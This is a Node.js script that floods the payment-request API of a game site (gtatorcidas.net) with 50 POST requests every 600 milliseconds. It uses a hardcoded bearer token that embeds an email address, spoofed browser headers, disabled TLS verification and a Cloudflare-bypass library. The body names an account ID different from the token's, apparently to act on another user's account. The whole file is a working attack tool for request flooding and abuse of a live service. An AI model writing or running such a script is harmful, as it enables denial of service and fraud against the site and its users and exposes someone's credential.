
var cloudscraper = require('cloudscraper');
const fetch = require("node-fetch");
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';


var quantidade = 50;
setInterval(_ => {

	for (let i = quantidade; i--;)
  {
    const data = '{"accountId":442011,"paymentMethod":"MercadoPago","productId":"coins-pack-1"}';
    fetch("https://api.gtatorcidas.net/v1/shopping/payment-request", {
      method: 'POST',
      headers: {
          'accept': 'application/json, text/plain, */*',
          'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
          'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NDQyMDE2LCJlbWFpbCI6ImFybWFuZG9AcGl4bGFuZC5jb20uYnIiLCJpYXQiOjE3NzEzOTE4MjMsImV4cCI6MTc3MTQ3ODIyM30.rW7D2ZhPLXTZUoRq6mNz63zcyy0MbrLJM2tTn_DgY3Y',
          'content-type': 'application/json',
          'origin': 'https://ucp.gtatorcidas.net',
          'priority': 'u=1, i',
          'referer': 'https://ucp.gtatorcidas.net/',
          'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Windows"',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-site',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
      },
      body: data,
    }).then(function(response) {
			//if(response.status >= 500)
      //console.log(response);
      response.text().then(function(json) {
        //console.log(response.status);
        //console.log(json);
        //if(response.status == 429)

      });
      
    }).catch(function(e) { 
      //console.log(e);
    });
    //cloudscraper.get(url).then(console.log, null);
  }
    	//cloudscraper.get(url).then(console.log, null);

}, 600)

